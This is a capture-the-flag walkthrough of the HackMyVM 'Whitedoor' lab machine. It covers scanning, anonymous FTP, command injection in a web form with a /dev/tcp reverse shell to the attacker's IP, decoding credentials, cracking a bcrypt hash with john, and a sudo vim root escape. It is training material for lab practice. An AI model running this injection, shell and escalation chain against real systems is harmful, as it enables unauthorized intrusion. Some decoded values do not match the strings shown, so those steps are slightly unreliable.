# Whitedoor Writeup HackMyVM

<div align="center">
<img src="https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Whitedoor/Whitedoor.png">
</div>
<br>
<strong> Whitedoor is a beginner-level Linux box featured on the HackMyVM platform!  <a href="https://hackmyvm.eu/machines/machine.php?vm=Whitedoor"> VM Link</a></strong>

## Enumeration

#### >> Find target ip with `netdiscover`
```shell
┌──(synix㉿zer0day)-[~]
└─$ sudo netdiscover -r 192.168.144.1
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                 
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102                                                                                                      
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.144.39  b6:0c:89:be:83:4d      1      42  Unknown vendor                                                                                                     
 192.168.144.158 08:00:27:f3:32:4a      1      60  PCS Systemtechnik GmbH
```
- Our Target IP is `192.168.144.158`
<br>

#### >> Let's enumerate services & ports with `nmap`
```shell
┌──(synix㉿zer0day)-[~]
└─$ sudo nmap -sC -sV 192.168.144.158
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-04 21:45 IST
Nmap scan report for 192.168.144.158
Host is up (0.00027s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.144.229
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Nov 16  2023 README.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Home
MAC Address: 08:00:27:F3:32:4A (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.46 seconds
```
- 21/tcp open FTP Anonymous login allowed!

```shell
┌──(synix㉿zer0day)-[~]
└─$ ftp  192.168.144.158
Connected to 192.168.144.158.
220 (vsFTPd 3.0.3)
Name (192.168.144.158:synix): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||24844|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        110          4096 Nov 16  2023 .
drwxr-xr-x    2 0        110          4096 Nov 16  2023 ..
-rw-r--r--    1 0        0              13 Nov 16  2023 README.txt
226 Directory send OK.
ftp> more README.txt
¡Good luck!
ftp> 
```
- Nothing much intresting! 🙂
<br>

#### >> Let's give visit to the webpage

<div align="center">
<img src="https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Whitedoor/1.png">
</div>
<br>

- Found out that the text box is vulnerable to command injection! 💉
<div align="center">
<img src="https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Whitedoor/2.png">
</div>
<br>

- Now that we found that we can run commands, lets exploit with a running a reverse shell to our machine
<br>

## Gaining Foothold ⛳

- Setup a Listener
```shell
┌──(synix㉿zer0day)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

- Let's Inject reverse shell to a command box
```shell
ls; bash -c 'exec bash -i &>/dev/tcp/192.168.144.229/4444 <&1'
```
<img src="https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Whitedoor/3.png">
<br>

- And we got the shell!!
- Okay now explore a bit

```shell
┌──(synix㉿zer0day)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.144.229] from (UNKNOWN) [192.168.144.158] 58518
bash: cannot set terminal process group (504): Inappropriate ioctl for device
bash: no job control in this shell
www-data@whitedoor:/var/www/html$ cd /home
cd /home
www-data@whitedoor:/home$ ls
ls
Gonzalo
whiteshell
www-data@whitedoor:/home$ cd whiteshell
cd whiteshell
www-data@whitedoor:/home/whiteshell$ ls -la
ls -la
total 48
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17  2023 .
drwxr-xr-x 4 root       root       4096 Nov 16  2023 ..
lrwxrwxrwx 1 root       root          9 Nov 16  2023 .bash_history -> /dev/null
-rw-r--r-- 1 whiteshell whiteshell  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 whiteshell whiteshell 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 whiteshell whiteshell 4096 Nov 16  2023 .local
-rw-r--r-- 1 whiteshell whiteshell  807 Apr 23  2023 .profile
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 Desktop
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 Documents
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 Downloads
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 Music
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 Pictures
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 Public
www-data@whitedoor:/home/whiteshell$ 
```

- And found out there is two user `whiteshell` and `Gonzalo`
- Let's explore more!!

```shell
www-data@whitedoor:/home/whiteshell$ cd Desktop	
cd Desktop
www-data@whitedoor:/home/whiteshell/Desktop$ ls -la
ls -la
total 12
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17  2023 ..
-r--r--r-- 1 whiteshell whiteshell   56 Nov 16  2023 .my_secret_password.txt
www-data@whitedoor:/home/whiteshell/Desktop$ cat .my_secret_password.txt
cat .my_secret_password.txt
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
```
- Found a hidden file named `.my_secret_password.txt`
- And looks like its a somekind of password hash

```shell
┌──(synix㉿zer0day)-[~]
└─$ echo "VGgxc0lzVGgzUDRzU3dPckRibGFjNQo=" | base64 -d                
Th1sIsTh3P4sSwOrDblac5
```
- And we found a Password!

#### >> Try login into SSH with this creds

```shell
┌──(synix㉿zer0day)-[~]
└─$ ssh whiteshell@192.168.144.158 
whiteshell@192.168.144.158's password: 
Linux whitedoor 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep  4 20:06:55 2024 from 192.168.144.229
whiteshell@whitedoor:~$ id
uid=1001(whiteshell) gid=1001(whiteshell) groups=1001(whiteshell)
whiteshell@whitedoor:~$ whoami
whiteshell
whiteshell@whitedoor:~$
```
- And yeah, We got the ssh shell!
- Let's Find out something more.
<br>

```shell
whiteshell@whitedoor:~$ cd ..
whiteshell@whitedoor:/home$ ls
Gonzalo  whiteshell
whiteshell@whitedoor:/home$ cd Gonzalo/
whiteshell@whitedoor:/home/Gonzalo$ ls -l
total 24
drwxr-xr-x 2 root Gonzalo 4096 Nov 17  2023 Desktop
drwxr-xr-x 2 root Gonzalo 4096 Nov 16  2023 Documents
drwxr-xr-x 2 root Gonzalo 4096 Nov 17  2023 Downloads
drwxr-xr-x 2 root Gonzalo 4096 Nov 17  2023 Music
drwxr-xr-x 2 root Gonzalo 4096 Nov 17  2023 Pictures
drwxr-xr-x 2 root Gonzalo 4096 Nov 17  2023 Public
whiteshell@whitedoor:/home/Gonzalo$ cd Desktop/
whiteshell@whitedoor:/home/Gonzalo/Desktop$ ls -l
total 4
-rw-r----- 1 root Gonzalo 20 Nov 16  2023 user.txt
whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat user.txt 
cat: user.txt: Permission denied
whiteshell@whitedoor:/home/Gonzalo/Desktop$ ls -la
total 16
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17  2023 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17  2023 ..
-r--r--r-- 1 root    root         61 Nov 16  2023 .my_secret_hash
-rw-r----- 1 root    Gonzalo      20 Nov 16  2023 user.txt
whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat .my_secret_hash 
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
```
- Found another hidden file named `.my_secret_hash ` and that contains somekind of string!
- Looks like a hash to me! 😫

#### >> Decrypt with `john`
```shell
┌──(synix㉿zer0day)-[~]
└─$ cat hash 
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
                                                                                                                                                                       
┌──(synix㉿zer0day)-[~]
└─$ sudo john hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
qwertyuiop       (?)     
1g 0:00:00:12 DONE 2/3 (2024-09-05 01:08) 0.08156g/s 176.1p/s 176.1c/s 176.1C/s bonita..gangsta
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- And we have Gonzalo's password, Let's try to login with Gonzalo!

```shell
whiteshell@whitedoor:/home/Gonzalo/Desktop$ su Gonzalo
Password: 
Gonzalo@whitedoor:~/Desktop$ id
uid=1002(Gonzalo) gid=1002(Gonzalo) groups=1002(Gonzalo)
Gonzalo@whitedoor:~/Desktop$ whoami
Gonzalo
Gonzalo@whitedoor:~/Desktop$ 
```
- And we got in!! 😈

```shell
Gonzalo@whitedoor:~/Desktop$ ls -la
total 16
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17  2023 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17  2023 ..
-r--r--r-- 1 root    root         61 Nov 16  2023 .my_secret_hash
-rw-r----- 1 root    Gonzalo      20 Nov 16  2023 user.txt
```
- And we got the user flag!! 👽
<br>

## Privilege Escalation

- Explore sudoers configuration for privilege escalation

```shell
Gonzalo@whitedoor:~/Desktop$ sudo -l
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

- Found out that user can run vim command without needing to be root user

#### >> Look <a href="https://gtfobins.github.io/gtfobins/vim/"> GTFObins </a> to find out udo privilege escalations for vim

```shell
sudo vim -c ':!/bin/sh'
```
- Let's Escalate!!!

```shell
Gonzalo@whitedoor:~/Desktop$ sudo /usr/bin/vim -c ':!/bin/sh'

# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls  	
root.txt
```
- And boom we own the machine, and also go the root flag!! 👾
